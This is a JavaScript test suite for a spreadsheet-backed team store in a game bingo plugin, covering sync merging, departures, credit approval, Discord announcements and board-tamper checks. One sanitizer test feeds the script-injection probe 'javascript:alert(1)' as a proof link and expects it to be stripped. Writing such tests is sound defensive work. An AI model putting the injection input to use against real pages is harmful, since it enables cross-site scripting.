'use strict';

/*
 * Automated tests for the REAL team store backend (docs/apps-script-store.gs),
 * executed under Node with in-memory Google service shims (gas-shim.js).
 * No game client, no Google account, no network. Run with:  node store-tests/run-tests.js
 *
 * Each test gets a brand-new store (fresh spreadsheet + fresh script context) and
 * drives doPost with the same JSON payloads the plugin sends.
 */

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { createEnvironment, FakeSheet } = require('./gas-shim');

const SOURCE = fs.readFileSync(path.join(__dirname, '..', 'docs', 'apps-script-store.gs'), 'utf8');

// The Teams tab is the store's allow-list, so every store starts with the host's teams
// already listed. Pass { teams: [...] } for a different list, or [] for a store the host
// has not set up yet.
const DEFAULT_TEAMS = [['Red', 'Red Team'], ['Blue', '']];

function newStore(options)
{
	const env = createEnvironment();
	const context = vm.createContext(Object.assign({}, env.globals));
	vm.runInContext(SOURCE, context, { filename: 'apps-script-store.gs' });
	// Tests edit the config tabs directly, without the onEdit trigger that clears the
	// config cache in a real sheet, so they read those tabs fresh. One test turns it on.
	if (!(options && options.configCache))
	{
		vm.runInContext('CONFIG_CACHE_SECONDS = 0', context);
	}
	const teams = options && options.teams ? options.teams : DEFAULT_TEAMS;
	vm.runInContext('getSheet(TEAMS_SHEET, TEAMS_HEADERS)', context);
	for (const row of teams)
	{
		env.spreadsheet.getSheetByName('Teams').appendRow(row);
	}
	return {
		context,
		urlFetches: env.urlFetches,
		urlFetchBlocked: env.urlFetchBlocked,
		urlFetchStatus: env.urlFetchStatus,
		setActive(name, row, col)
		{
			env.spreadsheet.setActive(name, row, col);
		},
		post(body)
		{
			// Like the plugin: a client pushing exactly one member is that member.
			if (body.members && body.rejoin === undefined && Object.keys(body.members).length === 1)
			{
				body = Object.assign({ rejoin: Object.keys(body.members)[0] }, body);
			}
			context.__body = JSON.stringify(body);
			const out = vm.runInContext('doPost({ postData: { contents: __body } })', context);
			return JSON.parse(out.getContent());
		},
		sheet(name)
		{
			return env.spreadsheet.getSheetByName(name);
		}
	};
}

// The payload shapes the plugin sends.
const A = 'aaaaaaaaaaaaaa01';
const B = 'bbbbbbbbbbbbbb02';
const X = 'cccccccccccccc03';

function member(name, tiles)
{
	return { name, tiles };
}

function tile(ts, goalCounts)
{
	return { goals: goalCounts.map(n => ({ n })), manual: false, ts };
}

const META = {
	name: 'Test board', size: 1,
	tiles: [{ label: '10 kills', goals: [{ label: 'Kills: Man', target: 10 }] }]
};

// ---------------------------------------------------------------- tiny test kit

const failures = [];
let current = '';

function is(actual, expected, what)
{
	const a = JSON.stringify(actual);
	const e = JSON.stringify(expected);
	if (a !== e)
	{
		failures.push(current + ': ' + what + ' - expected ' + e + ', got ' + a);
	}
}

function ok(condition, what)
{
	if (!condition)
	{
		failures.push(current + ': ' + what);
	}
}

function test(name, body)
{
	current = name;
	try
	{
		body();
	}
	catch (err)
	{
		failures.push(name + ': threw ' + (err && err.stack || err));
	}
}

// ---------------------------------------------------------------- the scenarios

test('per-tile merge is last-write-wins by owner timestamp', () =>
{
	const s = newStore();
	let r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 5, 'initial push stored');

	r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(500, [99]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 5, 'stale relay must not overwrite fresher data');

	r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(2000, [7]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 7, 'newer own push wins');
});

test('a timestamped reset beats a stale relayed copy (no resurrection)', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [13]) }) } });
	// Owner resets: empty progress with a FRESH timestamp (what resetOwnProgress pushes).
	let r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(3000, [0]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 0, 'reset stored');
	// An old teammate's cache relays the pre-reset progress.
	r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [13]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 0, 'stale relay must not resurrect wiped progress');
});

test('forged admin/invalid member ids are rejected from client pushes', () =>
{
	const s = newStore();
	const r = s.post({ board: 'b_red', rejoin: A, members: {
		'admin:kaos': member('Kaos (verified)', { 0: tile(1000, [99]) }),
		'not-a-hex-id!': member('Evil', { 0: tile(1000, [99]) }),
		[A]: member('Alice', { 0: tile(1000, [1]) })
	} });
	ok(!('admin:kaos' in r.members), 'client-sent admin: id must be dropped');
	ok(!('not-a-hex-id!' in r.members), 'non-16-hex id must be dropped');
	is(r.members[A].tiles['0'].goals[0].n, 1, 'valid member still stored');
});

test('adjustments ledger becomes verified credit; negative rows clamp at zero', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {} });
	s.sheet('Adjustments').appendRow(['', 1, '', 'Kaos', 40, '', 'laps 0-40', 'Rich']);
	let r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:kaos'].name, 'Kaos (verified)', 'synthetic member name');
	is(r.members['admin:kaos'].tiles['0'].goals[0].n, 40, 'credited amount');

	s.sheet('Adjustments').appendRow(['', 1, '', 'Kaos', -60, '', 'over-correction', 'Rich']);
	r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:kaos'].tiles['0'].goals[0].n, 0, 'total never goes negative');

	s.sheet('Adjustments').appendRow(['blue', 1, '', 'Bob', 5, '', 'other team', 'Rich']);
	r = s.post({ board: 'b_red', members: {} });
	ok(!('admin:bob' in r.members), 'rows for another team must not leak in');
});

test('Teams tab locks the store to host-defined codes', () =>
{
	const blank = newStore({ teams: [] });
	let r = blank.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	ok(!!r.error, 'nothing is accepted before the host lists any team');
	ok(!blank.sheet('Board red'), 'a rejected push cannot create a board tab');
	ok(!blank.sheet('Store'), 'nor any store rows');

	const s = newStore({ teams: [['Red', 'Red Team']] });
	r = s.post({ board: 'b_blue', members: {} });
	ok(!!r.error, 'unknown code rejected');
	is(r.teams, [{ code: 'red', name: 'Red Team' }], 'rejection still carries the team list');
	r = s.post({ board: 'b_solo', members: {} });
	ok(!!r.error, 'no team code rejected while teams are defined');
	r = s.post({ board: 'b_red', members: {} });
	ok(!r.error, 'listed code accepted');
});

test('leaving parks the row, stops it counting, and blocks relayed re-pushes', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	s.post({ board: 'b_red', remove: [A], members: {} });
	let r = s.post({ board: 'b_red', members: {} });
	ok(!(A in r.members), 'a member who left stops counting for the team');
	is(r.removed, [A], 'response lists the departure');
	ok(!!s.sheet('Store').data.find(row => row[1] === A), 'their row is kept for a return');

	const removedRows = s.sheet('Removed').data;
	is(removedRows[removedRows.length - 1][3], 'left', 'an automatic mark has reason left');

	r = s.post({ board: 'b_red', members: { [B]: member('Bob', {}), [A]: member('Alice', { 0: tile(2000, [9]) }) } });
	ok(!(A in r.members), 'a teammate relaying the departed member must be ignored');
	const parked = s.sheet('Store').data.find(row => row[1] === A);
	ok(parked[4].indexOf('"n":5') >= 0, 'and cannot edit what was parked');
});

test('coming back to a team restores what you earned there', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	s.post({ board: 'b_red', remove: [A], members: {} });
	// Alice plays for blue in the meantime, which parks her red row rather than moving it.
	let r = s.post({ board: 'b_blue', rejoin: A, members: { [A]: member('Alice', { 0: tile(3000, [2]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 2, 'blue starts her from scratch');

	// ...and coming home clears the mark, so red gets its 5 back, not blue's 2.
	r = s.post({ board: 'b_red', rejoin: A, members: {} });
	is(r.members[A].tiles['0'].goals[0].n, 5, 'red progress came back with her');
	is(r.removed, [], 'the departure mark is gone');
	r = s.post({ board: 'b_blue', members: {} });
	ok(!(A in r.members), 'and blue no longer counts her');
});

test('rejoining clears own "left" tombstones, but never admin evictions', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	s.post({ board: 'b_red', remove: [A], members: {} });

	let r = s.post({ board: 'b_red', rejoin: A, members: { [A]: member('Alice', { 0: tile(4000, [1]) }) } });
	is(r.removed, [], 'left tombstone cleared by the rejoin');
	is(r.members[A].tiles['0'].goals[0].n, 1, 'rejoined member syncs again (fresh progress)');

	// Admin eviction: hand-added row with no reason - a rejoin must NOT clear it.
	s.sheet('Removed').appendRow(['b_red', X, 'today', '']);
	r = s.post({ board: 'b_red', rejoin: X, members: { [X]: member('Xavier', { 0: tile(1000, [3]) }) } });
	ok(!(X in r.members), 'admin-evicted member stays out');
	is(r.removed, [X], 'admin tombstone survives the rejoin attempt');
});

test('an admin tombstone hides an existing store row even without deleting it', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	s.sheet('Removed').appendRow(['b_red', A, 'today', '']);
	const r = s.post({ board: 'b_red', members: {} });
	ok(!(A in r.members), 'tombstoned member filtered from responses');
});

test('leaving a since-delisted team still cleans up (remove before allow-list)', () =>
{
	const s = newStore({ teams: [['Old', 'Old team']] });
	s.post({ board: 'b_old', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	s.sheet('Teams').data.splice(1, 1);                // the host delists that team
	s.sheet('Teams').appendRow(['Red', 'Red Team']);
	const r = s.post({ board: 'b_old', remove: [A], members: {} });
	ok(!r.error, 'the departure notice itself succeeds');
	const rows = s.sheet('Removed').data.filter(row => row[0] === 'b_old' && row[1] === A);
	is(rows.length, 1, 'the eviction still landed');
});

test('board views render one tab per team', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [10]) }) } });
	ok(!!s.sheet('Board red'), 'team gets its own Board tab');
	const s2 = newStore();
	const solo = s2.post({ board: 'b_solo', meta: META, members: { [A]: member('Alice', {}) } });
	ok(!!solo.error, 'a player who has not chosen a team cannot write');
	ok(!s2.sheet('Board'), 'and gets no board tab of their own');
});

test('teamsOnly requests return the team list with each team\'s member names', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	s.post({ board: 'b_red', members: { [B]: member('Bob', { 0: tile(1000, [1]) }) } });
	const r = s.post({ teamsOnly: true, board: 'b' });
	is(r.teams, [
		{ code: 'red', name: 'Red Team', members: ['Alice', 'Bob'] },
		{ code: 'blue', name: '', members: [] }], 'team list with members');
	ok(!('members' in r), 'no board data in a teams-only reply');

	// A member who left no longer shows in the picker.
	s.post({ board: 'b_red', members: {}, remove: [B] });
	const after = s.post({ teamsOnly: true, board: 'b' });
	is(after.teams[0].members, ['Alice'], 'departed member filtered out');

	// Without a board key (nothing imported yet), names come from any board scope.
	const anyBoard = s.post({ teamsOnly: true });
	is(anyBoard.teams[0].members, ['Alice'], 'board-less request still lists names');
});

test('credit requests land on the Requests tab, validated and de-duplicated', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {} });
	s.post({ board: 'b_red', members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: '', add: 40, complete: false, note: 'laps 0-40, screenshots in #proof' } });
	let rows = s.sheet('Requests').data;
	is(rows.length, 2, 'request appended after the header');
	is(rows[1][2], 'Alice', 'player recorded');
	is(rows[1][1], 'red', 'team derived from the board scope, not from the client');
	is(rows[1][3], '1 - 10 kills', 'tile cell carries the label for reviewing admins');
	is(rows[1][9], 'Pending', 'starts Pending');

	// A retried send must not duplicate the pending request.
	s.post({ board: 'b_red', members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: '', add: 40, complete: false, note: 'laps 0-40, screenshots in #proof' } });
	is(s.sheet('Requests').data.length, 2, 'identical pending request not duplicated');

	// Garbage is dropped: bad member id, no amount and no complete.
	s.post({ board: 'b_red', members: {}, request:
		{ member: 'nope', player: 'Evil', tile: 1, add: 5 } });
	s.post({ board: 'b_red', members: {}, request:
		{ member: B, player: 'Bob', tile: 1 } });
	is(s.sheet('Requests').data.length, 2, 'invalid requests never land');
});

test('approving a request writes the Adjustments row; denying only stamps it', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {} });
	s.post({ board: 'b_red', members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 40, complete: false, note: 'proof' } });
	s.post({ board: 'b_red', members: {}, request:
		{ member: B, player: 'Bob', tile: 1, goal: 1, add: 5, complete: false, note: 'nah' } });

	// Red team announces approvals on its webhook (Teams tab, Webhook column).
	s.sheet('Teams').data[1][2] = 'https://discord.com/api/webhooks/123/abc';

	const resolveRequests = vm.runInContext('resolveRequests', s.context);
	is(resolveRequests([2], true), 1, 'one request approved');
	is(resolveRequests([3], false), 1, 'one request rejected');
	is(resolveRequests([2, 3], true), 0, 'already-resolved rows are skipped');

	is(s.sheet('Requests').data[1][9], 'Done', 'status stamped');
	is(s.sheet('Requests').data[2][9], 'Rejected', 'status stamped');

	is(s.urlFetches.length, 1, 'exactly the approval announced to Discord, never the denial');
	is(s.urlFetches[0].url, 'https://discord.com/api/webhooks/123/abc', 'sent to the team webhook');
	const announced = JSON.parse(s.urlFetches[0].options.payload).content;
	ok(announced.indexOf('Alice') >= 0 && announced.indexOf('10 kills') >= 0,
		'announcement names the player and the tile');
	ok(announced.indexOf('completed') >= 0 && announced.indexOf('1/1 tiles') >= 0,
		'an approval that finishes the tile announces the completion');
	ok(announced.indexOf('BLACKOUT! Every tile complete') >= 0,
		'finishing the whole board announces the blackout, like the plugin');
	ok(announced.indexOf('lines complete') >= 0,
		'and the lines the blackout finished are announced alongside it');
	ok(announced.indexOf('1 - 10 kills') < 0, 'no tile number in the announcement');

	// A later approval on the already-complete tile is a plain credit line, and it
	// says exactly what was credited: amount, goal number and goal label.
	s.post({ board: 'b_red', members: {}, request:
		{ member: X, player: 'Cara', tile: 1, goal: 1, add: 2, complete: false, note: '' } });
	is(resolveRequests([4], true), 1, 'third request approved');
	const plain = JSON.parse(s.urlFetches[1].options.payload).content;
	ok(plain.indexOf('Credit approved') >= 0, 'non-completing approval stays a credit line');
	ok(plain.indexOf('+2 on goal 1 (Kills: Man)') >= 0, 'credit line spells out the request');

	const r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:alice'].tiles['0'].goals[0].n, 40, 'approved request became verified credit');
	ok(!('admin:bob' in r.members), 'rejected request credits nothing');

	// Withdrawing an approval names the request and carries its note.
	const setRequestStatus = vm.runInContext('setRequestStatus', s.context);
	ok(setRequestStatus(2, 'Rejected'), 'approved request rejected');
	const withdrawn = JSON.parse(s.urlFetches[2].options.payload).content;
	ok(withdrawn.indexOf('withdrawn') >= 0 && withdrawn.indexOf('Alice') >= 0
		&& withdrawn.indexOf('+40 on goal 1 (Kills: Man)') >= 0 && withdrawn.indexOf('proof') >= 0,
		'withdrawal spells out the request and keeps its note');
});

test('flipping the status dropdown applies it once - no double credit', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 40, complete: false, note: 'proof' } });
	const setRequestStatus = vm.runInContext('setRequestStatus', s.context);

	// The dropdown path: Done -> pending -> Done again.
	ok(setRequestStatus(2, 'Done'), 'dropdown Done applies');
	ok(setRequestStatus(2, 'Pending'), 'flip back to Pending');
	ok(setRequestStatus(2, 'Done'), 'Done again');
	ok(!setRequestStatus(2, 'nonsense'), 'unknown status refused');

	const tag = 'request ' + s.sheet('Requests').data[1][11] + ':';
	ok(/^r[0-9a-f]{12}$/.test(String(s.sheet('Requests').data[1][11])), 'new requests carry a stable id');
	const credited = s.sheet('Adjustments').data
		.filter(row => String(row[6] || '').indexOf(tag) === 0);
	is(credited.length, 1, 'only one Adjustments row despite the flip-flop');
	let r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:alice'].tiles['0'].goals[0].n, 40, 'credited exactly once');

	// Rejecting an approved request takes the credit back.
	ok(setRequestStatus(2, 'Rejected'), 'flip Done to Rejected');
	is(s.sheet('Adjustments').data
		.filter(row => String(row[6] || '').indexOf(tag) === 0).length, 0,
		'the approval\'s ledger row is removed');
	r = s.post({ board: 'b_red', members: {} });
	ok(!('admin:alice' in r.members), 'withdrawn credit no longer served');

	// And approving again re-credits cleanly.
	ok(setRequestStatus(2, 'Done'), 'Done after the rejection');
	r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:alice'].tiles['0'].goals[0].n, 40, 're-approved credit is back, once');
});

test('a verified completion that finishes a row announces the bingo line with points', () =>
{
	const META2 = { name: 'Line board', size: 2, linePoints: 10, diagonals: false, tiles: [
		{ label: 'a', goals: [{ label: 'ga', target: 1 }] },
		{ label: 'b', goals: [{ label: 'gb', target: 1 }] },
		{ label: 'c', goals: [{ label: 'gc', target: 1 }] },
		{ label: 'd', goals: [{ label: 'gd', target: 1 }] }
	] };
	const s = newStore();
	s.sheet('Teams').data[1][2] = 'https://discord.com/api/webhooks/123/abc';
	s.post({ board: 'b_red', meta: META2, members: {} });
	s.post({ board: 'b_red', members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 1, complete: false, note: '' } });
	s.post({ board: 'b_red', members: {}, request:
		{ member: A, player: 'Alice', tile: 2, goal: 1, add: 1, complete: false, note: '' } });
	const resolveRequests = vm.runInContext('resolveRequests', s.context);
	is(resolveRequests([2], true), 1, 'first tile approved');
	is(resolveRequests([3], true), 1, 'second tile approved');

	const first = JSON.parse(s.urlFetches[0].options.payload).content;
	ok(first.indexOf('completed **a**') >= 0 && first.indexOf('Bingo!') < 0,
		'first completion finishes no line yet');
	const second = JSON.parse(s.urlFetches[1].options.payload).content;
	ok(second.indexOf('completed **b**') >= 0
		&& second.indexOf('Bingo! Line complete (+10 pts)') >= 0,
		'the row-finishing completion announces the line and its points');
});

test('pasting an updated board code auto-resets tiles whose tracking changed', () =>
{
	const sha = text => require('crypto').createHash('sha256').update(text, 'utf8').digest('hex');
	const v1 = '{"id":"ev","name":"E","size":2,"tiles":['
		+ '{"label":"a","goals":[{"type":"DROP","items":["Bones"],"count":10}]},'
		+ '{"label":"b","goals":[{"type":"DROP","items":["Egg"],"count":10}]},'
		+ '{"label":"c","goals":[{"type":"KC","npcs":["Zulrah"],"count":5}]},'
		+ '{"label":"d"}]}';
	// Tile a becomes manual (tracks something else); tile b only raises its target.
	const v2 = '{"id":"ev","name":"E","size":2,"tiles":['
		+ '{"label":"a"},'
		+ '{"label":"b","goals":[{"type":"DROP","items":["Egg"],"count":25}]},'
		+ '{"label":"c","goals":[{"type":"KC","npcs":["Zulrah"],"count":5}]},'
		+ '{"label":"d"}]}';

	const s = newStore();
	s.post({ fetchBoard: true }); // creates the tab
	s.sheet('Board code').appendRow([v1]);
	let r = s.post({ board: 'id_ev_red', boardHash: sha(v1), boardVersion: 1, members:
		{ [A]: member('Alice', { 0: tile(1000, [5]), 1: tile(1000, [7]) }) } });
	ok(!r.error, 'progress stored under the v1 board');

	// The host pastes v2; the menu action applies it on demand and reports.
	s.sheet('Board code').data[1][0] = v2;
	const reconcileBoardCode = vm.runInContext('reconcileBoardCode', s.context);
	const sha256Hex = vm.runInContext('sha256Hex', s.context);
	const report = reconcileBoardCode(vm.runInContext('readBoardCode', s.context)(), sha256Hex(v2));
	ok(report.indexOf('Reset 1 re-tracked tile(s)') >= 0 && report.indexOf('1 - a') >= 0,
		'the menu report names the reset tile');
	ok(reconcileBoardCode(v2, sha256Hex(v2)).indexOf('unchanged') >= 0,
		'running it again reports nothing to do');

	r = s.post({ board: 'id_ev_red', boardHash: sha(v1), boardVersion: 1, members: {} });
	ok(!!r.error, 'the outdated client is still rejected');

	r = s.post({ board: 'id_ev_red', boardHash: sha(v2), boardVersion: 1, members: {} });
	ok(!r.error, 'updated client syncs');
	ok(!r.members[A].tiles['0'].goals.length, 'the re-tracked tile was reset for everyone');
	is(r.members[A].tiles['1'].goals[0].n, 7, 'the target-only change kept its progress');

	// A stale relay of the old numbers loses to the fresh wipe.
	r = s.post({ board: 'id_ev_red', boardHash: sha(v2), members:
		{ [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	ok(!r.members[A].tiles['0'].goals.length, 'wipe survives relayed caches');
});

test('the reset menu reads the selected tile straight off a Board view tab', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	const selectedBoardTile = vm.runInContext('selectedBoardTile', s.context);

	// The sync built the "Board red" view; its 1x1 grid sits at row 4.
	s.setActive('Board red', 4, 1);
	is(selectedBoardTile(), { team: 'red', tileNumber: 1, label: '10 kills' },
		'a grid cell maps to its tile');

	// The goal table (header row 7, first data row 8) maps through its Tile column.
	s.setActive('Board red', 8, 4);
	is(selectedBoardTile().tileNumber, 1, 'a goal-table row maps to its tile');

	s.setActive('Board red', 2, 1);
	ok(!!selectedBoardTile().error, 'a non-tile selection is refused');
	s.setActive('Teams', 2, 1);
	is(selectedBoardTile(), null, 'other tabs fall back to the typed prompt');
});

test('the menu can reset one tile\'s stored progress for a team, resurrection-proof', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {
		[A]: member('Alice', { 0: tile(1000, [3]), 1: tile(1000, [7]) }) } });
	s.post({ board: 'b_red', members: { [B]: member('Bob', { 0: tile(1000, [2]) }) } });

	const resetStoreTileProgress = vm.runInContext('resetStoreTileProgress', s.context);
	ok(resetStoreTileProgress('red', 1).indexOf('2 member(s)') >= 0, 'both members wiped');
	ok(resetStoreTileProgress('red', 99).indexOf('does not exist') >= 0, 'bad tile refused');
	ok(resetStoreTileProgress('nope', 1).indexOf('No board found') >= 0, 'unknown team refused');

	let r = s.post({ board: 'b_red', members: {} });
	ok(!r.members[A].tiles['0'].goals.length, 'tile 1 progress wiped');
	is(r.members[A].tiles['1'].goals[0].n, 7, 'other tiles untouched');

	// A teammate's cache relaying the old numbers must not bring them back.
	r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [3]) }) } });
	ok(!r.members[A].tiles['0'].goals.length, 'stale relay loses to the fresh wipe');
});

test('dropdown announcements queue in the no-network trigger context and flush on sync', () =>
{
	const s = newStore();
	s.sheet('Teams').data[1][2] = 'https://discord.com/api/webhooks/123/abc';
	s.post({ board: 'b_red', meta: META, members: {} });
	s.post({ board: 'b_red', members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 40, complete: false, note: 'proof' } });
	const setRequestStatus = vm.runInContext('setRequestStatus', s.context);

	// Google refuses external calls inside the dropdown's simple trigger.
	s.urlFetchBlocked.value = true;
	ok(setRequestStatus(2, 'Done'), 'dropdown approval still applies');
	is(s.urlFetches.length, 0, 'nothing sent from the blocked context');

	// The next client sync runs fully authorized and delivers the parked message.
	s.urlFetchBlocked.value = false;
	s.post({ board: 'b_red', members: {} });
	is(s.urlFetches.length, 1, 'queued announcement delivered on the next sync');
	ok(JSON.parse(s.urlFetches[0].options.payload).content.indexOf('Alice') >= 0,
		'and it is the approval message');
	s.post({ board: 'b_red', members: {} });
	is(s.urlFetches.length, 1, 'delivered once, not on every sync');
});

test('the /exec URL serves the player portal to browsers (no board param)', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [4]) }) },
		request: { member: A, player: 'Alice', tile: 1, add: 4, note: 'test' } });
	const doGet = vm.runInContext('doGet', s.context);
	const page = doGet({ parameter: {} }).getContent();
	ok(page.indexOf('Test board') >= 0, 'board name embedded');
	ok(page.indexOf('submitFormRequest') >= 0, 'request form wired to the server function');
	ok(page.indexOf('"done":false') >= 0, 'tile completion state embedded');
	ok(page.indexOf('"total":4') >= 0, 'live goal progress embedded');
	ok(page.indexOf('"status":"Pending"') >= 0, 'request status embedded');
	ok(page.indexOf('Alice: 4') >= 0, 'per-player contributions embedded');
});

test('browser form requests land with member "form" and sanitized proof links', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('MobileMike', {}) } });
	const submit = vm.runInContext('submitFormRequest', s.context);

	let refused = '';
	try
	{
		submit({ board: 'b_red', player: 'Stranger', tile: 1, add: '5' });
	}
	catch (err)
	{
		refused = err.message;
	}
	ok(/Pick your name/.test(refused), 'a name nobody synced to the team is refused');

	submit({ board: 'b_red', player: 'MobileMike', tile: 1, goal: '', add: '40',
		complete: false, note: 'laps 0-40',
		links: 'https://imgur.com/a/abc, javascript:alert(1) notaurl https://cdn.discordapp.com/x.png' });

	const rows = s.sheet('Requests').data;
	is(rows.length, 2, 'request row appended');
	is(rows[1][8], 'form', 'browser requests are marked form');
	is(rows[1][2], 'MobileMike', 'picked player name recorded');
	is(rows[1][10], 'https://imgur.com/a/abc\nhttps://cdn.discordapp.com/x.png',
		'only http(s) links survive, junk dropped');

	let threw = false;
	try
	{
		submit({ board: 'b_red', player: '', tile: 1, add: '5' });
	}
	catch (err)
	{
		threw = true;
	}
	ok(threw, 'invalid form request is rejected with an error message');
	is(s.sheet('Requests').data.length, 2, 'nothing appended for the invalid request');

	// Approval treats form requests exactly like plugin ones.
	const resolveRequests = vm.runInContext('resolveRequests', s.context);
	is(resolveRequests([2], true), 1, 'form request marked Done');
	const r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:mobilemike'].tiles['0'].goals[0].n, 40, 'approved form request became credit');
});

test('opening the sheet creates the admin-facing tabs before any player syncs', () =>
{
	const s = newStore();
	vm.runInContext('onOpen()', s.context);
	ok(!!s.sheet('Teams'), 'Teams tab ready for the admin to define team codes');
	ok(!!s.sheet('Adjustments'), 'Adjustments tab ready');
	ok(!!s.sheet('Requests'), 'Requests tab ready');
});

test('the Settings tab publishes the host poll interval to clients', () =>
{
	const s = newStore();
	let r = s.post({ board: 'b_red', members: {} });
	is(r.pollSeconds, 120, 'settings tab is prefilled with the default');

	const settings = s.sheet('Settings').data;
	is(settings[1][0], 'Poll interval (seconds)', 'settings tab seeds the knob row');
	settings[1][1] = '45';
	r = s.post({ board: 'b_red', members: {} });
	is(r.pollSeconds, 45, 'host interval served with every sync');

	settings[1][1] = 'garbage';
	r = s.post({ board: 'b_red', members: {} });
	is(r.pollSeconds, 0, 'nonsense values read as unset');

	is(settings[2][0], 'Portal URL (web app /exec)', 'settings tab seeds the portal URL row');
	const readPortalUrl = vm.runInContext('readPortalUrl', s.context);
	is(readPortalUrl(), null, 'blank portal URL reads as unset');
	settings[2][1] = 'not a url';
	is(readPortalUrl(), null, 'junk portal URL rejected');
	settings[2][1] = 'https://script.google.com/macros/s/xyz/exec';
	is(readPortalUrl(), 'https://script.google.com/macros/s/xyz/exec', 'https URL accepted');
});

test('players can fetch the board code the host pasted onto the sheet', () =>
{
	const s = newStore();
	let r = s.post({ fetchBoard: true });
	ok(!!r.error, 'no board pasted yet gives a clear error');

	const sheet = s.sheet('Board code');
	sheet.appendRow(['{"name":"Test board","size":1,']);
	sheet.appendRow(['"tiles":[{"label":"x"}]}']);
	r = s.post({ fetchBoard: true });
	is(r.boardJson, '{"name":"Test board","size":1,\n"tiles":[{"label":"x"}]}',
		'multi-row paste joined back into one board code');

	const s2 = newStore();
	s2.post({ fetchBoard: true });
	s2.sheet('Board code').appendRow(['this is not json']);
	r = s2.post({ fetchBoard: true });
	ok(!!r.error && r.error.indexOf('not valid') >= 0, 'junk paste reported to the player');

	// The classic Sheets corruption: quotes stripped by a multi-cell paste.
	const s3 = newStore();
	s3.post({ fetchBoard: true });
	s3.sheet('Board code').appendRow(['{']);
	s3.sheet('Board code').appendRow(['name: "Bingo Bananza",']);
	s3.sheet('Board code').appendRow(['tiles: []}']);
	r = s3.post({ fetchBoard: true });
	ok(!!r.error && r.error.indexOf('corrupted') >= 0, 'quote-stripped paste diagnosed specifically');
});

test('machine tabs are created hidden; human tabs are not', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {} });
	ok(s.sheet('Store').hidden === true, 'Store hidden');
	ok(s.sheet('Meta').hidden === true, 'Meta hidden');
	ok(!s.sheet('Adjustments').hidden, 'Adjustments visible');
	ok(!s.sheet('Teams').hidden, 'Teams visible');
});

test('a tampered board cannot sync once the host pasted the official code', () =>
{
	const s = newStore();
	const official = '{"name":"Official","version":2,"tiles":[{"label":"Any weed"}]}';
	s.post({ fetchBoard: true }); // creates the tab
	s.sheet('Board code').appendRow([official]);
	const goodHash = require('crypto').createHash('sha256').update(official, 'utf8').digest('hex');

	let r = s.post({ board: 'b_red', boardHash: goodHash, boardVersion: 2, members: {} });
	ok(!r.error, 'the official board syncs');

	r = s.post({ board: 'b_red', boardHash: 'deadbeef', boardVersion: 2, meta: META,
		members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	ok(!!r.error && r.error.indexOf('Wrong board') >= 0, 'edited board rejected outright');
	r = s.post({ board: 'b_red', boardHash: goodHash, boardVersion: 2, members: {} });
	ok(!(A in r.members), 'nothing from the rejected push was stored');

	// A client still on an older version is told about the update, not accused. The
	// message stays short (it sits on the plugin's store button); newerVersion lets
	// the plugin show its full board-update notice.
	r = s.post({ board: 'b_red', boardHash: 'deadbeef', boardVersion: 1, members: {} });
	is(r.error, 'Board updated', 'outdated client gets the short update message');
	is(r.newerVersion, 2, 'and the version the host pasted');
	r = s.post({ board: 'b_red', boardHash: 'deadbeef', boardVersion: 2, members: {} });
	ok(!('newerVersion' in r), 'same-version tampering carries no update hint');


	// A client that sends no fingerprint at all cannot prove which board it runs.
	r = s.post({ board: 'b_red', meta: META, members: {} });
